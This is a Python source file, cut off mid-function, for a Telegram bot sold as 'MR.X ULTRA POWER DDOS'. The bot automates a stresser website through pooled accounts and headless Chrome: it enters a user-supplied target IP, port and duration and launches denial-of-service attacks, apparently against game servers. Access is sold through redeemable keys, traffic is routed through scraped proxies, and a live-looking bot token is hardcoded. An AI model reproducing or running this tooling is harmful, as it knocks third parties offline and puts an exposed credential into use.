import asyncio
import time
import logging
import os
import re
import json
import string
import random
import pickle
import threading
import requests
import signal
import sys
from bs4 import BeautifulSoup
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8562518597:AAGpVd-4xGZx3mJgkXQo2AYUKooJE_JWgZk"
OWNER_ID = 6643958471
CHROME_PATH = "/usr/bin/google-chrome"

# Data files
DATA_JSON = "users_data.json"
DATA_TXT = "users_data.txt"
COOKIES_FILE = "session_cookies.pkl"
ACCOUNTS_FILE = "accounts.json"

# Cooldown Configuration
cooldown_enabled = True
user_cooldown_duration = 600
user_last_attack = {}

# Cons Configuration
TOTAL_CONS = 10
MAX_ATTACK_TIME = 300
MIN_ATTACK_TIME = 30

cons_slots = {}
for i in range(1, TOTAL_CONS + 1):
    cons_slots[i] = {
        'busy': False,
        'user_id': None,
        'end_time': 0,
        'driver': None,
        'account_token': None
    }

# Queue System
attack_queue = []
queue_positions = {}

# Accounts Pool
accounts = {}  # {token: {"driver": None, "cookies": None, "logged_in": False, "last_used": 0}}
accounts_lock = threading.Lock()

# Logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Global variables
user_state = {}
main_driver = None
logged_in = False
data = {
    "approved_users": {},
    "admins": {},
    "keys": {},
    "disapproved_users": []
}

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self):
        self.fast_proxies = []
        self.medium_proxies = []
        self.slow_proxies = []
        self.lock = threading.Lock()
        self.last_fetch = 0
        self.REFRESH_INTERVAL = 3600

    def fetch_proxies(self, count=300):
        all_proxies = []
        sources = [
            "https://free-proxy-list.net/",
            "https://www.sslproxies.org/",
            "https://www.us-proxy.org/",
        ]
        for url in sources:
            try:
                response = requests.get(url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                table = soup.find('table')
                if table:
                    for row in table.find_all('tr')[1:101]:
                        cols = row.find_all('td')
                        if len(cols) >= 2:
                            ip = cols[0].text.strip()
                            port = cols[1].text.strip()
                            all_proxies.append(f"{ip}:{port}")
            except:
                continue
        return list(set(all_proxies))[:count]

    def test_proxy_with_speed(self, proxy):
        try:
            start = time.time()
            test_url = "http://httpbin.org/ip"
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            response = requests.get(test_url, proxies=proxies, timeout=10)
            response_time = time.time() - start
            if response.status_code == 200:
                return {'proxy': proxy, 'working': True, 'speed': response_time}
        except:
            pass
        return {'proxy': proxy, 'working': False, 'speed': None}

    def refresh_pool(self):
        all_proxies = self.fetch_proxies(300)
        fast, medium, slow = [], [], []
        for proxy in all_proxies:
            result = self.test_proxy_with_speed(proxy)
            if result['working']:
                if result['speed'] < 2:
                    fast.append(result['proxy'])
                elif result['speed'] < 5:
                    medium.append(result['proxy'])
                else:
                    slow.append(result['proxy'])
        with self.lock:
            self.fast_proxies = fast
            self.medium_proxies = medium
            self.slow_proxies = slow
            self.last_fetch = time.time()

    def get_best_proxy(self):
        if time.time() - self.last_fetch > self.REFRESH_INTERVAL:
            self.refresh_pool()
        with self.lock:
            if self.fast_proxies:
                return self.fast_proxies.pop(0)
            elif self.medium_proxies:
                return self.medium_proxies.pop(0)
            elif self.slow_proxies:
                return self.slow_proxies.pop(0)
        return None

    def start_auto_refresh(self):
        def loop():
            while True:
                self.refresh_pool()
                time.sleep(self.REFRESH_INTERVAL)
        thread = threading.Thread(target=loop, daemon=True)
        thread.start()

proxy_manager = ProxyManager()

# ==================== ACCOUNT MANAGEMENT ====================
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                data = json.load(f)
                for token, acc_data in data.items():
                    accounts[token] = {
                        'driver': None,
                        'cookies': acc_data.get('cookies'),
                        'logged_in': False,
                        'last_used': 0
                    }
    except:
        pass

def save_accounts():
    try:
        data = {}
        for token, acc in accounts.items():
            data[token] = {
                'cookies': acc.get('cookies'),
                'logged_in': False  # Don't save driver state
            }
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(data, f, indent=4)
    except:
        pass

# ==================== DATA MANAGEMENT ====================
def load_data():
    global data
    try:
        if os.path.exists(DATA_JSON):
            with open(DATA_JSON, 'r') as f:
                data = json.load(f)
    except:
        pass

def save_data():
    try:
        with open(DATA_JSON, 'w') as f:
            json.dump(data, f, indent=4)
    except:
        pass

def get_time_left(expiry_str):
    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
        now = datetime.now()
        delta = expiry - now
        if delta.days < 0:
            return "⚠️ Expired"
        return f"✅ {delta.days} days"
    except:
        return "N/A"

def generate_random_key():
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(20))

def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    if str(user_id) in data.get("admins", {}):
        return True
    return False

def is_approved(user_id):
    if is_admin(user_id):
        return True
    if str(user_id) in data.get("approved_users", {}):
        return True
    return False

# ==================== COOLDOWN FUNCTIONS ====================
def check_user_cooldown(user_id):
    if is_owner(user_id) or is_admin(user_id):
        return True, 0
    if not cooldown_enabled:
        return True, 0
    last_attack = user_last_attack.get(user_id, 0)
    if last_attack == 0:
        return True, 0
    elapsed = time.time() - last_attack
    if elapsed >= user_cooldown_duration:
        return True, 0
    else:
        remaining = int(user_cooldown_duration - elapsed)
        return False, remaining

# ==================== CONS MANAGEMENT ====================
def find_free_slot():
    current_time = time.time()
    for slot_id, slot in cons_slots.items():
        if not slot['busy'] or current_time >= slot['end_time']:
            if slot['busy'] and current_time >= slot['end_time']:
                if slot['driver']:
                    try:
                        slot['driver'].quit()
                    except:
                        pass
                    slot['driver'] = None
                slot['busy'] = False
                slot['user_id'] = None
                slot['end_time'] = 0
                slot['account_token'] = None
            return slot_id
    return None

def get_free_slots_count():
    current_time = time.time()
    count = 0
    for slot in cons_slots.values():
        if not slot['busy'] or current_time >= slot['end_time']:
            count += 1
    return count

def get_next_free_time():
    current_time = time.time()
    min_time = float('inf')
    for slot in cons_slots.values():
        if slot['busy'] and slot['end_time'] > current_time:
            time_left = slot['end_time'] - current_time
            if time_left < min_time:
                min_time = time_left
    return int(min_time) if min_time != float('inf') else 0

# ==================== BROWSER FUNCTIONS ====================
def create_chrome_with_proxy(proxy=None):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--memory-pressure-off")
    if proxy:
        chrome_options.add_argument(f'--proxy-server=http://{proxy}')
    service = Service(ChromeDriverManager().install())
    return webdriver.Chrome(service=service, options=chrome_options)

def get_available_account():
    """Returns a logged-in account token and driver"""
    with accounts_lock:
        for token, acc in accounts.items():
            if acc['logged_in'] and acc['driver']:
                acc['last_used'] = time.time()
                return token, acc['driver']
    return None, None

# ==================== KEYBOARD BUILDERS ====================
def get_owner_keyboard():
    keyboard = [
        ["🔐 Login", "🔍 Check Status"],
        ["✅ Approve User", "❌ Disapprove User"],
        ["👮 Add Admin", "🚫 Remove Admin"],
        ["🎟️ Generate Key", "🚀 Run Attack"],
        ["📊 View Stats", "🔴 Logout"],
        ["⏱️ Cooldown ON/OFF", "⏲️ Set Cooldown"],
        ["📊 Slot Status", "🔁 /start"],
        ["➕ Add Account", "➖ Remove Account"],
        ["📋 List Accounts", "🔐 Login All"],
        ["🔄 Refresh Login", "🗑️ Delete Token"],
        ["🧹 Clear Data"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_admin_keyboard():
    keyboard = [
        ["✅ Approve User", "❌ Disapprove User"],
        ["👮 Add Admin", "🚫 Remove Admin"],
        ["🎟️ Generate Key", "🚀 Run Attack"],
        ["📊 View Stats"],
        ["⏱️ Cooldown ON/OFF", "⏲️ Set Cooldown"],
        ["📊 Slot Status"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_approved_keyboard():
    keyboard = [
        ["🚀 Run Attack"],
        ["📊 My Status"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_user_keyboard():
    keyboard = [
        ["🎟️ Redeem Key"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ==================== ACCOUNT HANDLERS ====================
async def add_account_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.")
        return
    user_state[user_id] = 'awaiting_account_token'
    await update.message.reply_text("➕ Add Account\n\nPlease send the website token:")

async def process_add_account_token(update: Update, context: ContextTypes.DEFAULT_TYPE, token: str):
    user_id = update.effective_user.id
    if token in accounts:
        await update.message.reply_text("❌ Account already exists.")
        user_state.pop(user_id, None)
        return
    
    # Store token temporarily
    context.user_data['new_account_token'] = token
    
    # Create new browser for this account
    driver = create_chrome_with_proxy()
    driver.get("https://satellitestress.st/login")
    await asyncio.sleep(5)
    
    # Enter token
    try:
        wait = WebDriverWait(driver, 15)
        token_field = wait.until(EC.presence_of_element_located((By.ID, "token")))
        token_field.clear()
        token_field.send_keys(token)
        
        driver.save_screenshot("captcha_view.png")
        with open("captcha_view.png", "rb") as photo:
            await update.message.reply_photo(photo=photo, caption="✅ Token Entered.\n\n🔢 Now send the Captcha characters:")
        os.remove("captcha_view.png")
        
        # Store driver in user state
        context.user_data['account_driver'] = driver
        user_state[user_id] = 'awaiting_account_captcha'
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
        driver.quit()
        user_state.pop(user_id, None)

async def process_add_account_captcha(update: Update, context: ContextTypes.DEFAULT_TYPE, captcha: str):
    user_id = update.effective_user.id
    driver = context.user_data.get('account_driver')
    token = context.user_data.get('new_account_token')
    
    if not driver or not token:
        await update.message.reply_text("❌ Something went wrong. Try again.")
        user_state.pop(user_id, None)
        return
    
    try:
        captcha_field = driver.find_element(By.CSS_SELECTOR, "input[aria-label='Enter captcha answer']")
        captcha_field.send_keys(captcha)
        
        login_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        login_btn.click()
        
        await asyncio.sleep(6)
        
        if "dashboard" in driver.current_url or "attack" in driver.current_url:
            # Login successful
            with accounts_lock:
                accounts[token] = {
                    'driver': driver,
                    'cookies': driver.get_cookies(),
                    'logged_in': True,
                    'last_used': time.time()
                }
            save_accounts()
            
            await update.message.reply_text(f"✅ Account added and logged in successfully! Total accounts: {len(accounts)}", reply_markup=get_owner_keyboard())
        else:
            driver.save_screenshot("fail.png")
            with open("fail.png", "rb") as f:
                await update.message.reply_photo(f, caption="❌ Login failed.")
            os.remove("fail.png")
            driver.quit()
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
        driver.quit()
    finally:
        user_state.pop(user_id, None)
        context.user_data.clear()

async def list_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.")
        return
    
    if not accounts:
        await update.message.reply_text("📋 No accounts added yet.", reply_markup=get_owner_keyboard())
        return
    
    msg = "📋 ACCOUNTS:\n\n"
    for i, (token, acc) in enumerate(accounts.items(), 1):
        status = "✅ Logged in" if acc['logged_in'] and acc['driver'] else "❌ Not logged in"
        last_used = f" | Last used: {int(time.time() - acc['last_used'])}s ago" if acc['last_used'] else ""
        msg += f"{i}. {token[:15]}... : {status}{last_used}\n"
    
    await update.message.reply_text(msg, reply_markup=get_owner_keyboard())

async def remove_account_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.")
        return
    
    if not accounts:
        await update.message.reply_text("📋 No accounts to remove.", reply_markup=get_owner_keyboard())
        return
    
    msg = "➖ Remove Account\n\nSelect account number to remove:\n\n"
    tokens = list(accounts.keys())
    for i, token in enumerate(tokens, 1):
        status = "✅" if accounts[token]['logged_in'] else "❌"
        msg += f"{i}. {status} {token[:20]}...\n"
    
    context.user_data['remove_tokens'] = tokens
    user_state[user_id] = 'awaiting_remove_account'
    await update.message.reply_text(msg)

async def process_remove_account(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    tokens = context.user_data.get('remove_tokens', [])
    
    try:
        idx = int(text.strip()) - 1
        if 0 <= idx < len(tokens):
            token = tokens[idx]
            
            # Close driver if exists
            if accounts[token]['driver']:
                try:
                    accounts[token]['driver'].quit()
                except:
                    pass
            
            # Remove account
            with accounts_lock:
                del accounts[token]
            save_accounts()
            
            await update.message.reply_text(f"✅ Account removed successfully!", reply_markup=get_owner_keyboard())
        else:
            await update.message.reply_text("❌ Invalid number.")
    except:
        await update.message.reply_text("❌ Invalid input.")
    finally:
        user_state.pop(user_id, None)
        context.user_data.clear()

async def login_all_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.")
        return
    
    await update.message.reply_text("🔄 Logging in all accounts... This may take a while.")
    
    for token, acc in accounts.items():
        if acc['logged_in'] and acc['driver']:
            continue  # Already logged in
        
        # Create new browser
        driver = create_chrome_with_proxy()
        driver.get("https://satellitestress.st/login")
        await asyncio.sleep(5)
        
        try:
            wait = WebDriverWait(driver, 15)
            token_field = wait.until(EC.presence_of_element_located((By.ID, "token")))
            token_field.clear()
            token_field.send_keys(token)
            
            # Can't auto-fill captcha, so need user interaction
            driver.save_screenshot(f"login_{token[:8]}.png")
            with open(f"login_{token[:8]}.png", "rb") as photo:
                await update.message.reply_photo(photo=photo, caption=f"🔑 Captcha needed for token {token[:8]}...\nPlease use '➕ Add Account' to complete login.")
            os.remove(f"login_{token[:8]}.png")
            driver.quit()
            
        except Exception as e:
            await update.message.reply_text(f"❌ Failed for token {token[:8]}: {str(e)}")
            driver.quit()

async def refresh_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.")
        return
    
    await update.message.reply_text("🔄 Use '➕ Add Account' to re-add accounts that need fresh login.", reply_markup=get_owner_keyboard())

async def delete_token_only(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.")
        return
    
    if not accounts:
        await update.message.reply_text("📋 No tokens to delete.", reply_markup=get_owner_keyboard())
        return
    
    msg = "🗑️ Delete Token\n\nSelect token number to delete (account will NOT be logged out):\n\n"
    tokens = list(accounts.keys())
    for i, token in enumerate(tokens, 1):
        msg += f"{i}. {token[:20]}...\n"
    
    context.user_data['delete_tokens'] = tokens
    user_state[user_id] = 'awaiting_delete_token'
    await update.message.reply_text(msg)

async def process_delete_token(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    tokens = context.user_data.get('delete_tokens', [])
    
    try:
        idx = int(text.strip()) - 1
        if 0 <= idx < len(tokens):
            token = tokens[idx]
            
            # Close driver if exists
            if accounts[token]['driver']:
                try:
                    accounts[token]['driver'].quit()
                except:
                    pass
            
            # Remove account
            with accounts_lock:
                del accounts[token]
            save_accounts()
            
            await update.message.reply_text(f"✅ Token deleted successfully!", reply_markup=get_owner_keyboard())
        else:
            await update.message.reply_text("❌ Invalid number.")
    except:
        await update.message.reply_text("❌ Invalid input.")
    finally:
        user_state.pop(user_id, None)
        context.user_data.clear()

# ==================== LOGIN FLOW (Original - for main_driver) ====================
async def start_login_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global main_driver, logged_in
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.", reply_markup=get_user_keyboard())
        return
    try:
        if not main_driver:
            chrome_options = Options()
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--window-size=1920,1080")
            service = Service(ChromeDriverManager().install())
            main_driver = webdriver.Chrome(service=service, options=chrome_options)
        main_driver.get("https://satellitestress.st/login")
        await asyncio.sleep(10)
        main_driver.save_screenshot("login_screen.png")
        with open("login_screen.png", 'rb') as photo:
            await update.message.reply_photo(photo=photo, caption="📸 Login Page Loaded.\n\n🔑 Please send the Access Token:")
        os.remove("login_screen.png")
        user_state[user_id] = {'step': 'waiting_token'}
    except Exception as e:
        await update.message.reply_text(f"❌ Login Error: {str(e)}")

async def enter_token(update: Update, context: ContextTypes.DEFAULT_TYPE, token: str):
    user_id = update.effective_user.id
    try:
        wait = WebDriverWait(main_driver, 15)
        token_field = wait.until(EC.presence_of_element_located((By.ID, "token")))
        token_field.clear()
        token_field.send_keys(token)
        user_state[user_id] = {'step': 'waiting_captcha'}
        main_driver.save_screenshot("captcha_view.png")
        with open("captcha_view.png", "rb") as photo:
            await update.message.reply_photo(photo=photo, caption="✅ Token Entered.\n\n🔢 Now send the Captcha characters:")
        os.remove("captcha_view.png")
    except Exception as e:
        await update.message.reply_text(f"❌ Token Error: {str(e)}")
        user_state.pop(user_id, None)

async def enter_captcha(update: Update, context: ContextTypes.DEFAULT_TYPE, captcha: str):
    global logged_in
    user_id = update.effective_user.id
    try:
        captcha_field = main_driver.find_element(By.CSS_SELECTOR, "input[aria-label='Enter captcha answer']")
        captcha_field.send_keys(captcha)
        login_btn = main_driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        login_btn.click()
        await asyncio.sleep(6)
        if "dashboard" in main_driver.current_url or "attack" in main_driver.current_url:
            logged_in = True
            await update.message.reply_text("✅ Login Success! 🎉\n\n🚀 You can now use attack!", reply_markup=get_owner_keyboard())
        else:
            main_driver.save_screenshot("fail.png")
            with open("fail.png", "rb") as f:
                await update.message.reply_photo(f, caption="❌ Login failed.")
            os.remove("fail.png")
    except Exception as e:
        await update.message.reply_text(f"❌ Login Error: {str(e)}")
    finally:
        user_state.pop(user_id, None)

# ==================== STATUS FUNCTIONS ====================
async def check_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.", reply_markup=get_user_keyboard())
        return
    if not main_driver:
        await update.message.reply_text("❌ Browser not initialized.", reply_markup=get_owner_keyboard())
        return
    try:
        if "dashboard" in main_driver.current_url or "attack" in main_driver.current_url:
            logged_in = True
            await update.message.reply_text("✅ Status: LOGGED IN 🟢", reply_markup=get_owner_keyboard())
        else:
            logged_in = False
            await update.message.reply_text("❌ Status: NOT LOGGED IN 🔴", reply_markup=get_owner_keyboard())
    except:
        await update.message.reply_text("❌ Status: ERROR ⚠️", reply_markup=get_owner_keyboard())

async def logout_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global main_driver, logged_in
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.", reply_markup=get_user_keyboard())
        return
    if main_driver:
        main_driver.quit()
        main_driver = None
    logged_in = False
    await update.message.reply_text("✅ Browser session closed. 🔴", reply_markup=get_owner_keyboard())

async def toggle_cooldown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global cooldown_enabled
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Not authorized.")
        return
    cooldown_enabled = not cooldown_enabled
    status = "ON 🔴" if cooldown_enabled else "OFF 🟢"
    await update.message.reply_text(f"✅ Cooldown is now {status}", reply_markup=get_owner_keyboard() if is_owner(user_id) else get_admin_keyboard())

async def set_user_cooldown_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Not authorized.")
        return
    user_state[user_id] = 'awaiting_user_cooldown'
    await update.message.reply_text("⏱️ Set User Cooldown\n\nPlease send duration in seconds (10-600):")

async def process_set_user_cooldown(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    global user_cooldown_duration
    user_id = update.effective_user.id
    try:
        duration = int(text.strip())
        if duration < 10 or duration > 600:
            await update.message.reply_text("❌ Please choose between 10-600 seconds.")
            return
        user_cooldown_duration = duration
        minutes = duration / 60
        await update.message.reply_text(f"✅ User cooldown set to {duration}s ({minutes:.1f} min)", reply_markup=get_owner_keyboard() if is_owner(user_id) else get_admin_keyboard())
    except:
        await update.message.reply_text("❌ Invalid number.")
    finally:
        user_state.pop(user_id, None)

async def slot_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Not authorized.")
        return
    current_time = time.time()
    free_slots = []
    busy_slots = []
    for slot_id, slot in cons_slots.items():
        if not slot['busy'] or current_time >= slot['end_time']:
            free_slots.append(slot_id)
        else:
            time_left = int(slot['end_time'] - current_time)
            busy_slots.append(f"Slot {slot_id}: {time_left}s left")
    
    # Count logged in accounts
    logged_in_accounts = sum(1 for acc in accounts.values() if acc['logged_in'] and acc['driver'])
    
    msg = f"📊 SLOT STATUS (10 Total)\n\n✅ Free: {len(free_slots)}/10\n🔴 Busy: {len(busy_slots)}/10\n\n"
    if busy_slots:
        msg += "⏳ Busy Slots:\n" + "\n".join(busy_slots) + "\n\n"
    if attack_queue:
        msg += f"👥 Queue: {len(attack_queue)} users waiting\n"
    msg += f"🔑 Logged in accounts: {logged_in_accounts}/{len(accounts)}"
    
    await update.message.reply_text(msg, reply_markup=get_owner_keyboard() if is_owner(user_id) else get_admin_keyboard())

# ==================== CLEAR DATA ====================
async def clear_data_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.")
        return
    await update.message.reply_text(
        "⚠️ Are you sure you want to delete ALL data files?\n"
        "This will remove:\n"
        "• users_data.json\n"
        "• accounts.json\n"
        "• session_cookies.pkl\n"
        "• users_data.txt\n\n"
        "Type YES to confirm:"
    )
    user_state[user_id] = 'awaiting_clear_confirm'

async def process_clear_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    if text.strip().upper() != "YES":
        await update.message.reply_text("❌ Confirmation failed. Data not deleted.", reply_markup=get_owner_keyboard())
        user_state.pop(user_id, None)
        return
    
    # Close all account drivers
    for acc in accounts.values():
        if acc['driver']:
            try:
                acc['driver'].quit()
            except:
                pass
    
    files_to_delete = [DATA_JSON, ACCOUNTS_FILE, COOKIES_FILE, DATA_TXT]
    deleted = []
    not_found = []
    for file in files_to_delete:
        if os.path.exists(file):
            try:
                os.remove(file)
                deleted.append(file)
            except:
                not_found.append(f"{file} (permission error)")
        else:
            not_found.append(f"{file} (not found)")
    
    msg = "🧹 Data Cleanup Complete!\n\n"
    if deleted:
        msg += "✅ Deleted:\n" + "\n".join(f"  • {f}" for f in deleted) + "\n"
    if not_found:
        msg += "⚠️ Not deleted:\n" + "\n".join(f"  • {f}" for f in not_found)
    
    await update.message.reply_text(msg, reply_markup=get_owner_keyboard())
    await update.message.reply_text("🔄 Restarting bot...")
    os.execv(sys.executable, ['python'] + sys.argv)

# ==================== ATTACK FUNCTIONS ====================
async def process_queue():
    while attack_queue and find_free_slot():
        user_id, chat_id, _ = attack_queue.pop(0)
        if user_id in queue_positions:
            del queue_positions[user_id]
        try:
            await context.bot.send_message(chat_id=chat_id, text="✅ Slot available! Please send your attack details again.")
        except:
            pass

async def execute_attack(slot_id, user_id, ip, port, duration, update, context, account_token, driver):
    slot = cons_slots[slot_id]
    slot['busy'] = True
    slot['user_id'] = user_id
    slot['end_time'] = time.time() + min(duration, MAX_ATTACK_TIME)
    slot['account_token'] = account_token
    
    try:
        # Use the provided driver (already logged in)
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚡ Wait 5 Seconds...")
        
        # Navigate to attack page
        driver.get("https://satellitestress.st/attack")
        await asyncio.sleep(6)
        
        wait = WebDriverWait(driver, 20)
        
        # Fill IP
        ip_in = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[placeholder='104.29.138.132']")))
        ip_in.clear()
        ip_in.send_keys(ip)
        
        # Fill Port
        port_in = driver.find_element(By.CSS_SELECTOR, "input[placeholder='80']")
        port_in.clear()
        port_in.send_keys(str(port))
        
        # Fill Time
        time_in = driver.find_element(By.CSS_SELECTOR, "input[placeholder='60']")
        time_in.clear()
        time_in.send_keys(str(duration))
        
        # Click launch button
        launch_btn = wait.until(EC.presence_of_element_located((By.XPATH, "//button[contains(text(), 'Launch Attack')]")))
        driver.execute_script("arguments[0].click();", launch_btn)
        
        await asyncio.sleep(2)
        
        free_slots = get_free_slots_count()
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"🚀 MR.X ULTRA POWER DDOS 🚀\n\n🚀 ATTACK BY: @MRXYTDM\n🎯 TARGET: {ip}\n🔌 PORT: {port}\n⏰ TIME: {duration}s\n🌎 GAME: BGMI\n\n📊 Slot: {slot_id}/10 | {free_slots-1}/10 free\n🔑 Account: {account_token[:8]}...",
            reply_markup=get_approved_keyboard()
        )
        
        if not is_owner(user_id) and not is_admin(user_id):
            user_last_attack[user_id] = time.time()
            
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Attack Error\n\n{str(e)}", reply_markup=get_approved_keyboard())
        
        # Mark account as possibly logged out
        with accounts_lock:
            if account_token in accounts:
                accounts[account_token]['logged_in'] = False
                accounts[account_token]['driver'] = None
        save_accounts()
        
    finally:
        # Don't quit the driver - keep it for future attacks
        slot['busy'] = False
        slot['user_id'] = None
        slot['end_time'] = 0
        slot['account_token'] = None
        await process_queue()
        import gc
        gc.collect()

async def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ Not authorized.\n\nTo buy key: @MRXYTDM", reply_markup=get_user_keyboard())
        return
    
    can_attack, wait_time = check_user_cooldown(user_id)
    if not can_attack:
        await update.message.reply_text(f"⏳ Your cooldown is active\n\nPlease wait {wait_time} seconds", reply_markup=get_approved_keyboard())
        return
    
    # Check for available logged-in account
    account_token, account_driver = get_available_account()
    if not account_token or not account_driver:
        await update.message.reply_text(
            "❌ No logged in accounts available.\n\n"
            "Use '➕ Add Account' to add and login an account first.",
            reply_markup=get_owner_keyboard() if is_owner(user_id) else get_approved_keyboard()
        )
        return
    
    slot_id = find_free_slot()
    if not slot_id:
        attack_queue.append((user_id, update.effective_chat.id, None))
        queue_positions[user_id] = len(attack_queue)
        next_free = get_next_free_time()
        await update.message.reply_text(f"⏳ All 10 slots are busy.\n\nYou are #{len(attack_queue)} in queue.\nNext slot free in ~{next_free} seconds.", reply_markup=get_approved_keyboard())
        return
    
    user_state[user_id] = ('awaiting_attack', slot_id, account_token, account_driver)
    free_slots = get_free_slots_count()
    await update.message.reply_text(
        f"🚀 READY TO ATTACK 🚀\n\nType 👉: <ip> <port> <time>\n\n"
        f"📊 Slot: {slot_id}/10 | {free_slots-1}/10 free\n"
        f"🔑 Using account: {account_token[:8]}...\n"
        f"⏱️ Time range: {MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}s",
        parse_mode='Markdown'
    )

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    if user_id not in user_state or not isinstance(user_state[user_id], tuple) or len(user_state[user_id]) != 4:
        return
    
    state, slot_id, account_token, account_driver = user_state[user_id]
    if state != 'awaiting_attack':
        return
    
    parts = text.strip().split()
    if len(parts) != 3:
        await update.message.reply_text("❌ Invalid format\n\nUse 👉: <ip> <port> <time>", parse_mode='Markdown')
        del user_state[user_id]
        return
    
    ip, port, duration = parts
    try:
        port = int(port)
        duration = int(duration)
        if duration < MIN_ATTACK_TIME or duration > MAX_ATTACK_TIME:
            await update.message.reply_text(f"❌ Time must be {MIN_ATTACK_TIME}-{MAX_ATTACK_TIME} seconds.")
            del user_state[user_id]
            return
    except:
        await update.message.reply_text("❌ Invalid numbers")
        del user_state[user_id]
        return
    
    asyncio.create_task(execute_attack(slot_id, user_id, ip, port, duration, update, context, account_token, account_driver))
    del user_state[user_id]

# ==================== USER MANAGEMENT ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "User"
    if is_owner(user_id):
        msg = "🚀 MR.X ULTRA POWER DDOS 🚀\n\n👑 Welcome Owner!\n\n🎮 Use the buttons below:"
        keyboard = get_owner_keyboard()
    elif is_admin(user_id):
        msg = "🚀 MR.X ULTRA POWER DDOS 🚀\n\n👮 Welcome Admin!\n\n🎮 Use the buttons below:"
        keyboard = get_admin_keyboard()
    elif is_approved(user_id):
        msg = f"🚀 MR.X ULTRA POWER DDOS 🚀\n\n✅ Welcome {user_name}!\nYou are Approved\n\n🎮 Use the buttons below:"
        keyboard = get_approved_keyboard()
    else:
